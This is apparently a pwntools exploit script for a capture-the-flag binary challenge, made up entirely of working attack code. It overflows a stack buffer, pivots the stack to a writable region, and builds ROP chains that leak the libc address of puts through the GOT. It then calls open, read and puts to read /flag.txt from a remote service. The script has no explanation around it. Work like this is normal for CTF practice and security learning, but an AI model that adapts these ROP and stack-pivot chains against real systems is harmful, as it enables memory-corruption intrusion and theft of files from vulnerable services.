from pwn import *

elf = ELF('./src/share/chal')
libc = elf.libc
context.arch = 'amd64'

OFF = 0x60
POP_RDI = next(elf.search(asm('pop rdi; ret')))
POP_RSI_R15 = next(elf.search(asm('pop rsi; pop r15; ret')))
READ_PLT = elf.plt['read']
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
SETVBUF_PLT = elf.plt['setvbuf']


WRITABLE = 0x404400
MAIN = elf.symbols['main']
POP_RSP = next(elf.search(asm('pop rsp; pop r13; pop r14; pop r15; ret')))

# p = process('./src/share/chal')
p = remote('10.113.0.01', 10403)
fs = b'A' * OFF + p64(WRITABLE) + p64(MAIN + 24)
print(hex(len(fs)))
p.sendline(fs)

# moved stack to writable
pivot = b'P' * 0x18 # for pop r13, r14, r15 
pivot += p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)
pivot = pivot.ljust(OFF, b'B')
pivot += p64(WRITABLE) + p64(POP_RSP) + p64(WRITABLE - OFF) + p64(MAIN + 24)
p.recvuntil(b'meow\n')
p.send(pivot)
leak = p.recvline().strip(b'\n').ljust(8, b'\x00')
print(leak)
leak = u64(leak)
print(f'leak: {hex(leak)}')
libc.address = leak - libc.symbols['puts']
print(f'libc: {hex(libc.address)}')

CALL_RAX = next(elf.search(asm('call rax; add rsp, 8; ret;')))
POP_RAX = next(libc.search(asm('pop rax; ret;'), executable=True))
DEADBEEF = 0xdeadbeefdeadbeef
XCHG_EDI_EAX = next(libc.search(asm('xchg edi, eax; ret;'), executable=True))
POP_RSI = next(libc.search(asm('pop rsi; ret;'), executable=True))
POP_RDX = next(libc.search(asm('pop rdx; pop r12; ret;'), executable=True))
POP_RSP = next(libc.search(asm('pop rsp; ret;'), executable=True))

orw = p64(POP_RDI) + p64(WRITABLE - 0x40) # filename
orw += p64(POP_RSI) + p64(0) # O_RDONLY
orw += p64(POP_RAX) + p64(libc.symbols['open']) + p64(CALL_RAX) + p64(DEADBEEF)
orw += p64(MAIN)
# orw += p64(CALL_RAX) + p64(DEADBEEF) + p64(XCHG_EDI_EAX)
# orw += p64(POP_RSI) + p64(WRITABLE) + p64(POP_RDX) # read(fd, WRITABLE, 0x80)
orw = orw.ljust(OFF - 0x10, b'A')
orw += (b'/flag.txt\x00').ljust(0x10, b'\x00')
orw += p64(WRITABLE) + p64(POP_RSP) + p64(WRITABLE - OFF - 0x30) 
# orw += p64(POP_RSI) + p64(WRITABLE) + p64(PUTS_PLT) # puts(WRITABLE)

print(hex(len(orw)))
# p.sendline(b'A')
p.sendline(orw)

POP_RDI = next(libc.search(asm('pop rdi; ret'), executable=True))

orw = p64(POP_RDI) + p64(5)  # file descriptor
orw += p64(POP_RSI) + p64(WRITABLE)  # buffer
orw += p64(POP_RDX) + p64(0x80) + p64(DEADBEEF)  # size
orw += p64(READ_PLT) 
orw += p64(POP_RDI) + p64(WRITABLE)  # buffer
orw += p64(PUTS_PLT)  # puts(buffer)

orw = orw.ljust(OFF, b'C')
orw += p64(WRITABLE) + p64(POP_RSP) + p64(WRITABLE - OFF - 0x50)


p.sendline(orw)
p.interactive()






